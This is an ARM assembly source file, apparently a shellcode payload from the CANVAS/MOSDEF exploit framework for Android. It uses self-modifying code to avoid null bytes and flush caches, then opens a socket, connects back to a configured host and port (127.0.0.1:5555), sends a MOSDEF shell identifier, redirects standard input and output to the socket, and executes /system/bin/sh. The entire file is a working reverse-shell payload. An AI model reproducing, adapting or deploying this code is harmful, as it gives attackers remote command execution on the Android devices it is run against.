.globl main
.globl end

/* this is for Android ARM EABI (Embedded Application Binary Interface) */

/* cache flushing loop for arm, or alternatively use cacheflush if available */

main:

ldr r7, [pc,#0]
b sigtrap0
.word 0x000f0001    /* __ARM_NR_breakpoint ... EABI */
.word 0xffffffff
sigtrap0:
add r1, pc, #4
sub r2, r2, r2
strb r2, [r1,#0]
svc #1              /* should be svc #0 but preventing \u0000 */

/* patch up all the svc calls to be svc #0, then cache flush */
sub r2, r2, r2
add r1,pc,#0
strb r2, [r1,#84]
/* r1 points here, pc is 8 bytes ahead */
strb r2, [r1,#108]
strb r2, [r1,#140]
strb r2, [r1,#168]
strb r2, [r1,#184]
strb r2, [r1,#200]
strb r2, [r1,#216]
strb r2, [r1,#252]
strb r2, [r1,#260]

/*

This is the proper way to sync the icache and dcache on RISC architectures, it
is a self modifying loop that only continues after it has nopped out it's own
looping branch.

*/

/* have to load the 32 bit constant this way as movw and movt are not available */

modloop:

ldr r1, [pc,#4]         /* pc is 8 bytes over */
bl setup

.word 0xffffffff        /* preventing \u0000 */
.word 0xe1a01001        /* mov r1, r1 */

setup:
    
mov r0, lr
add r0, r0, #24     /* offset to unconditional branch */
stmdb r0!, {r1}     /* this nops out the branch */
b modloop 

socket:

mov r0, #2
mov r1, #1
mov r2, #6
mov r7, #272
add r7, r7, #9
svc #1                  /* offset 21 * 4 from patch r1 */

connect:

mov r10, r0
add r1, pc, #164
mov r2, #16
mov r7, #272
add r7, r7, #11
svc #1                  /* offset 27 * 4 from patch r1 */

write_mosdef_type:

mov r1, #18           /* shell type index 18 canvasengine.ANDROID_SHELL */
mov r0, r1, lsl #24   /* shift into the right ordering*/
stmdb sp!, {r0}
mov r0, r10 
mov r1, sp
mov r2, #4
mov r7, #4
svc #1                  /* offset 34 * 4 from patch r1 */

write_shell_id:

eor r1, r1, r1          /* shell id */
stmdb sp!, {r1}
mov r0, r10 
mov r1, sp
mov r2, #4
mov r7, #4
svc #1                  /* offset 41 * 4 from patch r1 */

dup2:

mov r0, r10
eor r1, r1, r1
mov r7, #63
svc #1                  /* offset 45 * 4 from patch r1 */

mov r0, r10
mov r1, #1
mov r7, #63
svc #1                  /* offset 49 * 4 from patch r1 */

mov r0, r10
mov r1, #2
mov r7, #63
svc #1                  /* offset 53 * 4 from patch r1 */

execve:

add r0, pc, #44
add r5, pc, #56
eor r5, r5, r5
stmdb sp!, {r5}
stmdb sp!, {r0}
mov r1, sp
eor r2, r2, r2
mov r7, #11
svc #1                  /* offset 62 * 4 from patch r1 */

exit:

mov r7, #1
svc #1                  /* offset 64 * 4 from patch r1 */

a:

/* for sockaddr struct */
.byte 0x02
.byte 0x00

b:

/* port 5555 */
.byte 0x15
.byte 0xb3

c:

/* ip 127.0.0.1 */
.byte 0x7f
.byte 0x00
.byte 0x00
.byte 0x01

/* shell */
.asciz "//system/bin/sh"

/* 

EABI:

syscall in r7
args in r0-r6
svc #0

#define __NR_SYSCALL_BASE 0
...
#define __ARM_NR_BASE (__NR_SYSCALL_BASE+0x0f0000)
...
#define __ARM_NR_breakpoint (__ARM_NR_BASE+1) 
#define __ARM_NR_cacheflush (__ARM_NR_BASE+2)
...

*/

end:
